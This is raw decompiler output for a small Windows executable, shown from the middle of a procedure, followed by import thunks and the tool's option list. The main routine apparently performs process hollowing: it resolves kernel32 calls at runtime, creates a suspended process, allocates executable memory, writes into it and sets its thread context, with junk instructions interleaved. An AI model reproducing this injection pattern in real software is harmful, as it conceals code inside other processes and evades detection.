    eax = L00402764();
    (save)1024;
    (save)4222688;
    (save)0;
    L00401000("kernel32", *L00401B20);
    if(eax != 0) {
        eax = *eax();
    }
    *L00406BA0 = 68;
    *L00406BCC = 1;
    *L00406BD0 = 2;
    (save)0x402ab8;
    (save)0x4030d5;
    (save)0x401266;
}

stack space not deallocated on return
/*	Procedure: 0x004030D5 - 0x00403331
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004030D5()
{



    (save)4214796;
    (save)4223200;
    eax = L00401000("kernel32", *L0040239F);
    if(eax != 0) {
        *eax();
    }
    (save)4222688;
    (save)4223200;
    eax = L00401000("kernel32", *L0040239F);
    if(eax != 0) {
        *eax();
    }
    (save)4221924;
    (save)4221856;
    (save)0;
    (save)0;
    (save)4;
    (save)0;
    (save)0;
    (save)0;
    (save)4223200;
    (save)0;
    eax = L00401000("kernel32", *L0040285C);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax == 0) {
    } else {
        (save)0;
        eax = L00401000("kernel32", *L00401B00);
        if(eax != 0) {
            eax = *eax();
        }
        *L00406ED8 = eax;
        *L00406BF4 = *(eax + *(eax + 60) + 4 + 20 + 56);
        goto L00403194;
        *edi = *esi;
        edi = edi + 4;
        esi = esi + 4;
        asm("cdq");
        asm("pusha");
        asm("scasb");
L00403194:
        (save)64;
        (save)12288;
        (save) *L00406BF4;
        (save) *L00406ED8;
        (save) *L00406BE4;
        eax = L00401000("kernel32", *L00403190);
        if(eax != 0) {
            eax = *eax();
        }
        *L00406BF8 = eax;
        goto L004031d0;
        asm("arpl [edi-0x75],dx");
        >= ? 0x403239 : ;
L004031d0:
        asm("cld");
        -1 = *eax * eax;
        eax = eax ^ 4221940;
        (save) *L00406ED8;
        (save) *L00406BF8;
        (save) *L00406BE4;
        eax = L00401000("kernel32", *L004031CC);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax == 0) {
        } else {
            *L00406C04 = 65543;
            goto L0040321f;
            ebp :: *(eax + 73979227);
L0040321f:
            asm("insb");
            eax = eax + 1;
            bh = bh + bh;
            eax = eax ^ 4221928;
            L00401000("kernel32", *L0040321B);
            if(eax != 0) {
                *eax();
            }
            *L00406CBC = 0x402c8d;
            goto L00403252;
            ch = 42;
            > ? L0040323b : ;
L00403252:
            (save)4221956;
            (save) *L00406BE8;
            eax = L00401000("kernel32", *L0040324E);
            if(eax != 0) {
                eax = *eax();
            }
            if(eax == 0) {
            } else {
                goto L00403284;
                asm("fidivr word [edi+0x35ffafab]");
L00403284:
                Lff4072f6();
                eax = eax ^ 0x403280;
                (save)"kernel32";
                L00401000();
                if(eax != 0) {
                    eax = *eax();
                }
                (save)1024;
                (save)4275802;
                (save)0x402fe5;
                (save)0x4032bc;
                (save)0x401231;
                return;
                (save)1024;
                (save)4276826;
                (save)0x403044;
                (save)0x4032d6;
                (save)0x401231;
                return;
                (save)16;
                (save)4276826;
                (save)4275802;
                (save)0;
                (save)0x4032ef;
                (save)MessageBoxA;
                return;
                (save)13000;
                eax = L00401000("kernel32", *L004015F1);
                if(eax != 0) {
                    *eax();
                }
                (save)0;
                eax = L00401000("kernel32", *L00402089);
                if(eax != 0) {
                    eax = *eax();
                }
            }
        }
    }
    (save)0x403331;
    (save)0x401dd5;
    return;
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 00403332 -> 00403326 */
/*	Procedure: 0x00403332 - 0x00403337
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CloseHandle()
{



    goto ( *__imp__CloseHandle);
}

/* DEST BLOCK NOT FOUND: 00403338 -> 00403326 */
/*	Procedure: 0x00403338 - 0x0040333D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CreateEventA()
{



    goto ( *__imp__CreateEventA);
}

/* DEST BLOCK NOT FOUND: 0040333e -> 00403326 */
/*	Procedure: 0x0040333E - 0x00403343
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

CreateMutexA()
{



    goto ( *__imp__CreateMutexA);
}

/* DEST BLOCK NOT FOUND: 00403344 -> 00403326 */
/*	Procedure: 0x00403344 - 0x00403349
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

EnterCriticalSection()
{



    goto ( *__imp__EnterCriticalSection);
}

/* DEST BLOCK NOT FOUND: 0040334a -> 00403326 */
/*	Procedure: 0x0040334A - 0x0040334F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

FreeLibrary()
{



    goto ( *__imp__FreeLibrary);
}

/* DEST BLOCK NOT FOUND: 00403350 -> 00403326 */
/*	Procedure: 0x00403350 - 0x00403355
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetCommandLineA()
{



    goto ( *__imp__GetCommandLineA);
}

/* DEST BLOCK NOT FOUND: 00403356 -> 00403326 */
/*	Procedure: 0x00403356 - 0x0040335B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetFileSize()
{



    goto ( *__imp__GetFileSize);
}

/* DEST BLOCK NOT FOUND: 0040335c -> 00403326 */
/*	Procedure: 0x0040335C - 0x00403361
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetModuleFileNameA()
{



    goto ( *__imp__GetModuleFileNameA);
}

/* DEST BLOCK NOT FOUND: 00403362 -> 00403326 */
/*	Procedure: 0x00403362 - 0x00403367
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GetPrivateProfileStringA()
{



    goto ( *__imp__GetPrivateProfileStringA);
}

/* DEST BLOCK NOT FOUND: 00403368 -> 00403326 */
/*	Procedure: 0x00403368 - 0x0040336D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

GlobalLock()
{



    goto ( *__imp__GlobalLock);
}

/* DEST BLOCK NOT FOUND: 0040336e -> 00403326 */
/*	Procedure: 0x0040336E - 0x00403373
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

LoadLibraryA()
{



    goto ( *__imp__LoadLibraryA);
}

/* DEST BLOCK NOT FOUND: 00403374 -> 00403326 */
/*	Procedure: 0x00403374 - 0x00403379
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

DestroyWindow()
{



    goto ( *__imp__DestroyWindow);
}

/* DEST BLOCK NOT FOUND: 0040337a -> 00403326 */
/*	Procedure: 0x0040337A - 0x0040337F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

DrawFocusRect()
{



    goto ( *__imp__DrawFocusRect);
}

/* DEST BLOCK NOT FOUND: 00403380 -> 00403326 */
/*	Procedure: 0x00403380 - 0x00403385
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

MessageBoxA()
{



    goto ( *__imp__MessageBoxA);
}

/* DEST BLOCK NOT FOUND: 00403386 -> 00403326 */
/*	Procedure: 0x00403386 - 0x0040338B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

MessageBoxW()
{



    goto ( *__imp__MessageBoxW);
}

/* DEST BLOCK NOT FOUND: 0040338c -> 00403326 */
/*	Procedure: 0x0040338C - 0x00403391
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

PostQuitMessage()
{



    goto ( *__imp__PostQuitMessage);
}

/* DEST BLOCK NOT FOUND: 00403392 -> 00403326 */
/*	Procedure: 0x00403392 - 0x00403397
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

SendDlgItemMessageW()
{



    goto ( *__imp__SendDlgItemMessageW);
}

/* DEST BLOCK NOT FOUND: 00403398 -> 00403326 */
/*	Procedure: 0x00403398 - 0x0040339C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

TranslateMessage()
{



    goto ( *__imp__TranslateMessage);
}

/* address  size  */
/* 0x0040306f       0 */ /* unknown */ void 	__entry_point__;
/* 0x00403332       0 */ /* unknown */ void 	CloseHandle;
/* 0x00403338       0 */ /* unknown */ void 	CreateEventA;
/* 0x0040333e       0 */ /* unknown */ void 	CreateMutexA;
/* 0x00403344       0 */ /* unknown */ void 	EnterCriticalSection;
/* 0x0040334a       0 */ /* unknown */ void 	FreeLibrary;
/* 0x00403350       0 */ /* unknown */ void 	GetCommandLineA;
/* 0x00403356       0 */ /* unknown */ void 	GetFileSize;
/* 0x0040335c       0 */ /* unknown */ void 	GetModuleFileNameA;
/* 0x00403362       0 */ /* unknown */ void 	GetPrivateProfileStringA;
/* 0x00403368       0 */ /* unknown */ void 	GlobalLock;
/* 0x0040336e       0 */ /* unknown */ void 	LoadLibraryA;
/* 0x00403374       0 */ /* unknown */ void 	DestroyWindow;
/* 0x0040337a       0 */ /* unknown */ void 	DrawFocusRect;
/* 0x00403380       0 */ /* unknown */ void 	MessageBoxA;
/* 0x00403386       0 */ /* unknown */ void 	MessageBoxW;
/* 0x0040338c       0 */ /* unknown */ void 	PostQuitMessage;
/* 0x00403392       0 */ /* unknown */ void 	SendDlgItemMessageW;
/* 0x00403398       0 */ /* unknown */ void 	TranslateMessage;
/* 0x00404000       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00404004       0 */ /* unknown */ void 	__imp__CreateEventA;
/* 0x00404008       0 */ /* unknown */ void 	__imp__CreateMutexA;
/* 0x0040400c       0 */ /* unknown */ void 	__imp__EnterCriticalSection;
/* 0x00404010       0 */ /* unknown */ void 	__imp__FreeLibrary;
/* 0x00404014       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x00404018       0 */ /* unknown */ void 	__imp__GetFileSize;
/* 0x0040401c       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x00404020       0 */ /* unknown */ void 	__imp__GetPrivateProfileStringA;
/* 0x00404024       0 */ /* unknown */ void 	__imp__GlobalLock;
/* 0x00404028       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x00404030       0 */ /* unknown */ void 	__imp__DestroyWindow;
/* 0x00404034       0 */ /* unknown */ void 	__imp__DrawFocusRect;
/* 0x00404038       0 */ /* unknown */ void 	__imp__MessageBoxA;
/* 0x0040403c       0 */ /* unknown */ void 	__imp__MessageBoxW;
/* 0x00404040       0 */ /* unknown */ void 	__imp__PostQuitMessage;
/* 0x00404044       0 */ /* unknown */ void 	__imp__SendDlgItemMessageW;
/* 0x00404048       0 */ /* unknown */ void 	__imp__TranslateMessage;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
